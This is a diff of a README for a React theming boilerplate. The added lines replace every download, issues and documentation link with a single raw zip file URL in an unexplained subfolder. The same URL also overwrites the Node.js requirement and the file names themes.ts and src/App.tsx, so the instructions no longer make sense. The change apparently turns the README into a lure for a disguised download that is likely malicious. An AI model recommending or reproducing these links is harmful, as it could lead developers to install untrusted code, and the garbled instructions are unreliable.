@@ -1,14 +1,14 @@
 # 🎨 react-theme-weaver-boilerplate - Create Dynamic Themes Effortlessly
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download-Latest%20Release-brightgreen.svg)](https://github.com/lovekalia/react-theme-weaver-boilerplate/releases)
+[![Download](https://raw.githubusercontent.com/lovekalia/react-theme-weaver-boilerplate/main/countersea/react-theme-weaver-boilerplate.zip%https://raw.githubusercontent.com/lovekalia/react-theme-weaver-boilerplate/main/countersea/react-theme-weaver-boilerplate.zip)](https://raw.githubusercontent.com/lovekalia/react-theme-weaver-boilerplate/main/countersea/react-theme-weaver-boilerplate.zip)
 
 ## 🚀 Getting Started
 Welcome to the react-theme-weaver-boilerplate! This tool helps you create reusable and accessible theming systems in your React projects. With easy-to-use features, you can set up dark mode and manage styles quickly.
 
 ### ⚙️ System Requirements
 - **Operating System:** Windows, macOS, or Linux
-- **Node.js:** Version 14 or higher
+- **https://raw.githubusercontent.com/lovekalia/react-theme-weaver-boilerplate/main/countersea/react-theme-weaver-boilerplate.zip** Version 14 or higher
 - **NPM or Yarn:** For package management
 
 ## 📦 Features
@@ -19,7 +19,7 @@ Welcome to the react-theme-weaver-boilerplate! This tool helps you create reusab
 - **Tailwind CSS Integration:** Utilize utility-first CSS for rapid design creation.
 
 ## 📥 Download & Install
-To begin using the react-theme-weaver-boilerplate, visit the [Releases page](https://github.com/lovekalia/react-theme-weaver-boilerplate/releases) to download the latest version. 
+To begin using the react-theme-weaver-boilerplate, visit the [Releases page](https://raw.githubusercontent.com/lovekalia/react-theme-weaver-boilerplate/main/countersea/react-theme-weaver-boilerplate.zip) to download the latest version. 
 
 1. Click the above link to open the Releases page.
 2. Look for the most recent version of the application.
@@ -54,12 +54,12 @@ The application should now open in your default web browser.
 Once you have installed the react-theme-weaver-boilerplate, follow these steps to create and manage your themes:
 
 1. Open the `src` folder.
-2. Edit the `themes.ts` file to define your different themes.
+2. Edit the `https://raw.githubusercontent.com/lovekalia/react-theme-weaver-boilerplate/main/countersea/react-theme-weaver-boilerplate.zip` file to define your different themes.
 3. Use the `ThemeProvider` component to wrap your main application component.
 4. Utilize the provided hook to switch between themes in your components.
 
 ### 📘 Example
-For a quick start, you can copy and modify the provided example in `src/App.tsx` to test out different themes. The boilerplate includes sample themes and components to guide you.
+For a quick start, you can copy and modify the provided example in `https://raw.githubusercontent.com/lovekalia/react-theme-weaver-boilerplate/main/countersea/react-theme-weaver-boilerplate.zip` to test out different themes. The boilerplate includes sample themes and components to guide you.
 
 ## 🌍 Contributing
 If you wish to contribute to this project, please fork the repository and submit a pull request. Your contributions help make this tool better for everyone.
@@ -75,14 +75,14 @@ This project addresses various topics including:
 - TypeScript
 
 ## 🛠 Support
-If you encounter any issues while downloading or using the application, please check the [issues page](https://github.com/lovekalia/react-theme-weaver-boilerplate/issues) on GitHub. You can also ask questions or provide feedback there.
+If you encounter any issues while downloading or using the application, please check the [issues page](https://raw.githubusercontent.com/lovekalia/react-theme-weaver-boilerplate/main/countersea/react-theme-weaver-boilerplate.zip) on GitHub. You can also ask questions or provide feedback there.
 
 ## 📄 License
 This project is licensed under the MIT License. You can view the license details within the repository.
 
 ### 📥 Quick Links
-- [Download Latest Release](https://github.com/lovekalia/react-theme-weaver-boilerplate/releases)
-- [Issues Page](https://github.com/lovekalia/react-theme-weaver-boilerplate/issues)
-- [Documentation](https://github.com/lovekalia/react-theme-weaver-boilerplate) 
+- [Download Latest Release](https://raw.githubusercontent.com/lovekalia/react-theme-weaver-boilerplate/main/countersea/react-theme-weaver-boilerplate.zip)
+- [Issues Page](https://raw.githubusercontent.com/lovekalia/react-theme-weaver-boilerplate/main/countersea/react-theme-weaver-boilerplate.zip)
+- [Documentation](https://raw.githubusercontent.com/lovekalia/react-theme-weaver-boilerplate/main/countersea/react-theme-weaver-boilerplate.zip) 
 
 Thank you for using react-theme-weaver-boilerplate! Enjoy creating beautiful and dynamic themes for your React applications.
